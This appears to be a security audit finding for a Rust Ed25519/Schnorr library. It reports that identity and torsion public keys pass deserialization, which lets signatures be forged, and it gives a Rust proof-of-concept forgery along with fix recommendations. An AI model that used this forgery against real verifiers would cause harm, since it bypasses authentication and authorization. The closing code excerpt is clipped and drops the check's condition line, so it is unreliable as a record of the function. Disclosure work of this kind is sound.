### Title
Canonical Ed25519 identity and torsion public keys enable Schnorr signature forgery - ([File: crypto/ciphersuite/src/lib.rs](crypto/ciphersuite/src/lib.rs))

### Summary

`Ciphersuite::read_G` accepts any canonical `GroupEncoding` without rejecting the identity or checking prime-order subgroup membership. `SchnorrSignature::verify` then treats the supplied `Ed25519` `EdwardsPoint` as a valid public key and checks only `R + cA - sG == 0`. An unprivileged party can therefore provide the canonical identity public key and forge a signature for any challenge by choosing `s = r` and `R = rG`. Small-order torsion keys also permit practical grinding for `c * A = 0`.

### Finding Description

`SchnorrSignature::read` deserializes `R` and `s` with `C::read_G` and `C::read_F`. [1](#0-0)  Verification applies the Schnorr equation directly to the caller-provided public key. [2](#0-1) 

The generic `Ciphersuite::read_G` checks only that the decoded point round-trips to the same canonical encoding; it does not reject identity or enforce subgroup membership. [3](#0-2)  `Ed25519` uses the full `EdwardsPoint` type rather than a prime-order subgroup wrapper. [4](#0-3) 

Although `Curve::read_G` rejects identity, that stricter parser is specific to FROST and is not the parser used by standalone Schnorr verification or by callers deserializing an Ed25519 public key through `Ciphersuite::read_G`. [5](#0-4) 

### Impact Explanation

Any verifier that accepts an attacker-supplied Ed25519 public key and passes it to `SchnorrSignature::verify` accepts a forged signature bound to that key. For the identity key, forgery is unconditional because the public-key term vanishes. For an order-8 torsion key, an attacker can iterate nonces or messages until the challenge is divisible by 8, yielding a forged signature with expected eight trials.

This can bypass authentication, proof-of-possession checks, or authorization systems that interpret successful verification as control of the encoded public key.

### Likelihood Explanation

The attack requires the verifier to accept a public-key encoding from an untrusted party. No private key, malicious validator, protocol-state corruption, or implementation misuse beyond accepting the exposed `read_G`/`verify` boundary is required. The encoded identity key is canonical, deterministic, and always accepted by the shown parser.

### Recommendation

Reject the identity and non-prime-order group elements during Ed25519 public-key and signature-point deserialization. Prefer a subgroup-checked point type or explicitly call a subgroup-membership check after canonical decoding. `SchnorrSignature::verify` should additionally reject identity public keys and identity `R` values unless the protocol explicitly defines them as valid. FROST’s stricter `Curve::read_G` behavior should be extended to reject small-order points where the ciphersuite requires a prime-order group.

### Proof of Concept

```rust
use sha2::{Digest, Sha512};
use zeroize::Zeroizing;
use rand_core::OsRng;
use ciphersuite::{Ciphersuite, group::{ff::Field, Group, GroupEncoding}};
use dalek_ff_group::{Ed25519, Scalar};
use schnorr::SchnorrSignature;

// Canonical compressed identity encoding.
let identity_encoding = [1u8; 32];
let identity_key =
  Ed25519::read_G(&mut identity_encoding.as_slice()).unwrap();

// Construct R = rG and s = r. This satisfies R + cA - sG = 0 for
// every challenge c when A is identity.
let r = Zeroizing::new(Scalar::random(&mut OsRng));
let signature = SchnorrSignature::<Ed25519> {
  R: Ed25519::generator() * r.deref(),
  s: *r,
};

// A standard RFC8032-style challenge binding to R, A, and the message.
let message = b"attacker-controlled message";
let challenge = Scalar::from_hash(Sha512::new_with_prefix(
  [
    signature.R.to_bytes().as_ref(),
    identity_key.to_bytes().as_ref(),
    message,
  ].concat(),
));

assert!(signature.verify(identity_key, challenge));
```

The assertion succeeds even though the attacker does not know a discrete logarithm for the submitted public key.

  /// Read a canonical point from something implementing std::io::Read.
  ///
  /// The provided implementation is safe so long as `GroupEncoding::to_bytes` always returns a
  /// canonical serialization.
  #[cfg(any(feature = "alloc", feature = "std"))]
  #[allow(non_snake_case)]
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;

      Err(io::Error::other("non-canonical point"))?;

    Ok(point)
